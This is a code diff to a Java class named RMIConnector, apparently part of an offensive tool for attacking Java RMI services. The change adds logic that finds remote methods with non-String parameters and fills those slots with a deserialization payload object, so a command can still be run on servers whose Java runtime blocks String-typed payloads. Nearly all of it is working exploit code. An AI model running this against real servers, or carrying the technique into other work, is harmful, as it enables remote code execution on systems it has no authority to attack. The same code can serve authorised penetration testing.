@@ -254,6 +254,33 @@ public class RMIConnector {
             }
         }
     }
+    private boolean checkExploitableParam() {
+        for (Map.Entry<String, Remote> pair : remoteRefs.entrySet()) {
+            Method[] methods = null;
+
+            String registryName = pair.getKey();
+            Remote stub = pair.getValue();
+
+            try {
+                methods = customClassLoader.loadClass(registryName).getDeclaredMethods();
+            } catch (ClassNotFoundException e) {
+                e.printStackTrace();
+                break;
+            }
+
+            // Iterate over each method
+            for (Method me : methods) {
+                String methodSignature = me.toString();
+                for (Class c : me.getParameterTypes()) {
+                    if (c != java.lang.String.class) {
+                        return true;
+                    }
+                }
+            }
+        }
+        return false;
+    }
+
 
     public void exploit(String payloadName, String command) {
         Class clz = null;
@@ -275,8 +302,16 @@ public class RMIConnector {
             System.exit(1);
         }
 
-        if(!execute(payload)) {
-            System.err.println(Colors.RED + "[ERROR] Payload was not invoked. Check the accuracy of the signature. Ex: \"boolean login(java.lang.String a, java.lang.String b)\"" + Colors.ENDC);
+        // Check for universally exploitable param (i.e., non-primitives other than java.lang.String)
+        boolean exploitableParam = checkExploitableParam();
+
+        // Try preserving strings during execution if first try fails
+        if(!execute(payload, false) && !execute(payload, true)) {
+            if (exploitableParam) {
+                System.err.println(Colors.RED + "[ERROR] Payload was not invoked. Check the accuracy of the signature." + Colors.ENDC);
+            } else {
+                System.err.println(Colors.RED + "[ERROR] Server-side JRE (>=8u242-b07, >=11.0.6+10, >=13.0.2+5, >=14.0.1+2) can't be exploited by java.lang.String types" + Colors.ENDC);
+            }
         } else {
             System.out.println("Executed");
         }
@@ -284,7 +319,7 @@ public class RMIConnector {
 
     public void checkIfPresent() {
         try {
-            execute(dummyClass.newInstance());
+            execute(dummyClass.newInstance(), false);
         } catch (InstantiationException e) {
             e.printStackTrace();
         } catch (IllegalAccessException e) {
@@ -292,7 +327,10 @@ public class RMIConnector {
         }
     }
 
-    public boolean execute(Object payload) {
+    public boolean execute(Object payload, boolean preserveStrings) {
+        if (preserveStrings) {
+            System.out.println("[INFO] Re-running execute without overwriting java.lang.String types.");
+        }
         // Iterate for each registry name
         for (Map.Entry<String, Remote> pair : remoteRefs.entrySet()) {
             Method[] methods = null;
@@ -315,12 +353,35 @@ public class RMIConnector {
 
                     // Load payload or dummy object into param slots
                     Object[] params = new Object[me.getParameterCount()];
-                    Arrays.fill(params, payload);
+                    if (!preserveStrings) {
+                        Arrays.fill(params, payload);
+                    } else {
+                        int i = 0;
+                        for (Class c : me.getParameterTypes()) {
+                            if (c == java.lang.String.class) {
+                                params[i] = "";
+                            } else {
+                                params[i] = payload;
+                            }
+                            i++;
+                        }
+                    }
 
                     // Create fake parameter types for payload
                     Class[] fakeParameterTypes = new Class[me.getParameterCount()];
-                    Arrays.fill(fakeParameterTypes, payload.getClass());
-
+                    if (!preserveStrings) {
+                        Arrays.fill(fakeParameterTypes, payload.getClass());
+                    } else {
+                        int i = 0;
+                        for (Class c : me.getParameterTypes()) {
+                            if (c == java.lang.String.class) {
+                                fakeParameterTypes[i] = java.lang.String.class;
+                            } else {
+                                fakeParameterTypes[i] = payload.getClass();
+                            }
+                            i++;
+                        }
+                    }
                     // Bypass internal call flow for custom params
                     RemoteRef ref = null;
                     if (this.isActivationServer) {
